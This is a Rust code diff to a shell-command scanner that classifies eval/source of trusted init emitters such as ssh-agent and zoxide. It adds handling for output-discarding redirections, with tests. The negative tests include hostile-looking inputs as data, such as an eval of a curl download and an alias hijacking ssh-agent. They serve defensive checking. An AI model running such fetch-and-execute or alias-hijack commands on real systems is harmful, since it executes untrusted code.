@@ -12127,7 +12127,7 @@ const INIT_EMITTER_SHELLS: &[&str] = &["bash", "zsh", "fish", "sh", "ksh"];
 
 /// One of the reviewed shell-init emitter invocations whose standard output is
 /// the tool's own setup code: `brew shellenv`, `direnv hook <shell>`, `pyenv
-/// init -` / `--path`, `rbenv init -`, `ssh-agent -s`, `zoxide init <shell>`,
+/// init -` / `--path`, `rbenv init -`, `ssh-agent [-s]`, `zoxide init <shell>`,
 /// `starship init <shell>`, `fnm env`, `mise activate <shell>`, `kubectl
 /// completion <shell>` and `fzf --bash|--zsh|--fish`. `argv` holds literal
 /// words; the program is a bare name or an absolute path in
@@ -12151,7 +12151,9 @@ fn trusted_init_emitter_argv(argv: &[&str]) -> bool {
         ("pyenv", ["init", "-", target]) => shell(target),
         ("rbenv", ["init", "-"]) => true,
         ("rbenv", ["init", "-", target]) => shell(target),
-        ("ssh-agent", ["-s"]) => true,
+        // Bare `ssh-agent` prints the same setup as `-s` (csh syntax only
+        // when `$SHELL` is a csh, which a POSIX eval cannot run).
+        ("ssh-agent", [] | ["-s"]) => true,
         ("zoxide", ["init", target]) => shell(target),
         ("starship", ["init", target]) => shell(target),
         ("fnm", ["env", options @ ..]) => {
@@ -12495,9 +12497,57 @@ fn direct_init_emitter_operand(segment: &Segment, command: &str, shell: ShellTyp
         .raw
         .strip_prefix(command)
         .filter(|rest| rest.starts_with([' ', '\t']))
-        .is_some_and(|rest| {
-            trusted_init_emitter_operand(command, rest.trim_matches([' ', '\t']), shell)
-        })
+        .and_then(|rest| without_output_discards(rest.trim_matches([' ', '\t'])))
+        .is_some_and(|operand| trusted_init_emitter_operand(command, operand, shell))
+}
+
+/// `text` without its trailing output-discarding redirections, which only
+/// silence what the evaluated setup code prints: `>/dev/null`, `1>/dev/null`,
+/// `2>/dev/null`, `&>/dev/null` (spaced or not), and `2>&1` once stdout
+/// already goes to `/dev/null`. Each must follow whitespace. Any other
+/// redirection (`>>`, `<`, another file descriptor or target, a bare `2>&1`)
+/// is left in place, so the operand stays untrusted; `None` when a `2>&1`
+/// would send stderr to the terminal rather than discard it.
+fn without_output_discards(text: &str) -> Option<&str> {
+    let mut rest = text;
+    // (stdout discarded, stderr discarded, stderr joined to stdout), read
+    // right to left.
+    let mut redirections = Vec::new();
+    loop {
+        let trimmed = rest.trim_end_matches([' ', '\t']);
+        if let Some(before) = trimmed.strip_suffix("2>&1") {
+            if !before.ends_with([' ', '\t']) {
+                break;
+            }
+            redirections.push("2>&1");
+            rest = before;
+            continue;
+        }
+        let Some(before_target) = trimmed.strip_suffix("/dev/null") else {
+            break;
+        };
+        let before_operator = before_target.trim_end_matches([' ', '\t']);
+        let Some((operator, before)) = ["&>", "1>", "2>", ">"]
+            .iter()
+            .find_map(|operator| Some((*operator, before_operator.strip_suffix(operator)?)))
+        else {
+            break;
+        };
+        if !before.ends_with([' ', '\t']) {
+            break;
+        }
+        redirections.push(operator);
+        rest = before;
+    }
+    let mut stdout_discarded = false;
+    for operator in redirections.iter().rev() {
+        match *operator {
+            ">" | "1>" | "&>" => stdout_discarded = true,
+            "2>&1" if !stdout_discarded => return None,
+            _ => {}
+        }
+    }
+    Some(rest.trim_end_matches([' ', '\t']))
 }
 
 fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut ExecutableSubstitutionScan) {
@@ -19132,6 +19182,81 @@ mod tests {
     }
 
     #[test]
+    fn r4_trusted_init_emitter_with_discarded_output_has_no_gap() {
+        for (input, shell) in [
+            (r#"eval "$(ssh-agent -s)" >/dev/null"#, ShellType::Posix),
+            (r#"eval "$(ssh-agent -s)" > /dev/null"#, ShellType::Posix),
+            (
+                r#"eval "$(ssh-agent -s)" > /dev/null 2>&1"#,
+                ShellType::Posix,
+            ),
+            (
+                r#"eval "$(ssh-agent -s)" 1>/dev/null 2>/dev/null"#,
+                ShellType::Posix,
+            ),
+            (r#"eval "$(ssh-agent -s)" 2>/dev/null"#, ShellType::Posix),
+            (r#"eval "$(ssh-agent)" &>/dev/null"#, ShellType::Posix),
+            ("eval `ssh-agent -s` >/dev/null", ShellType::Posix),
+            (
+                r#"eval "$(ssh-agent -s)" >/dev/null && ssh-add ~/.ssh/id_ed25519"#,
+                ShellType::Posix,
+            ),
+            (
+                "source <(kubectl completion zsh) 2>/dev/null",
+                ShellType::Posix,
+            ),
+            (r#"eval "$(ssh-agent -s)" >/dev/null"#, ShellType::Fish),
+            ("eval (zoxide init fish) >/dev/null 2>&1", ShellType::Fish),
+        ] {
+            let scan = executable_substitution_scan(input, shell);
+            assert_eq!(scan.gap, None, "{input}");
+            assert!(!scan.bodies.is_empty(), "{input}");
+        }
+        for (input, shell) in [
+            (r#"eval "$(ssh-agent -s)" > out.txt"#, ShellType::Posix),
+            (r#"eval "$(ssh-agent -s)" >> /dev/null"#, ShellType::Posix),
+            (r#"eval "$(ssh-agent -s)" < /dev/null"#, ShellType::Posix),
+            (r#"eval "$(ssh-agent -s)" 3>/dev/null"#, ShellType::Posix),
+            (
+                r#"eval "$(ssh-agent -s)" >/dev/null 2>&1 3>/dev/null"#,
+                ShellType::Posix,
+            ),
+            (r#"eval "$(ssh-agent -s)" 2>&1"#, ShellType::Posix),
+            (
+                r#"eval "$(ssh-agent -s)" 2>&1 >/dev/null"#,
+                ShellType::Posix,
+            ),
+            (r#"eval "$(ssh-agent -s)" >"$OUT""#, ShellType::Posix),
+            (r#"eval "$(ssh-agent -s)">/dev/null"#, ShellType::Posix),
+            (r#"eval "$(ssh-agent -s)" >| /dev/null"#, ShellType::Posix),
+            (
+                r#"eval "$(curl -fsSL https://example.com/x)" >/dev/null"#,
+                ShellType::Posix,
+            ),
+            (
+                r#"SSH_AUTH_SOCK=/tmp/x eval "$(ssh-agent -s)" >/dev/null"#,
+                ShellType::Posix,
+            ),
+            (
+                r#"alias ssh-agent=evil; eval "$(ssh-agent -s)" >/dev/null"#,
+                ShellType::Posix,
+            ),
+        ] {
+            let scan = executable_substitution_scan(input, shell);
+            assert!(scan.gap.is_some(), "{input}");
+        }
+        assert_eq!(
+            without_output_discards(r#""$(x)" >/dev/null 2>&1"#),
+            Some(r#""$(x)""#)
+        );
+        assert_eq!(without_output_discards(r#""$(x)" 2>&1"#), None);
+        assert_eq!(
+            without_output_discards(r#""$(x)">/dev/null"#),
+            Some(r#""$(x)">/dev/null"#)
+        );
+    }
+
+    #[test]
     fn c4_untrusted_eval_and_source_bodies_keep_their_gap() {
         for (input, shell) in [
             (
@@ -19273,6 +19398,8 @@ mod tests {
             &["fnm", "env", "--shell=fish", "--use-on-cd"],
             &["kubectl", "completion", "bash"],
             &["fzf", "--fish"],
+            &["ssh-agent"],
+            &["ssh-agent", "-s"],
         ] {
             assert!(trusted_init_emitter_argv(argv), "{argv:?}");
         }
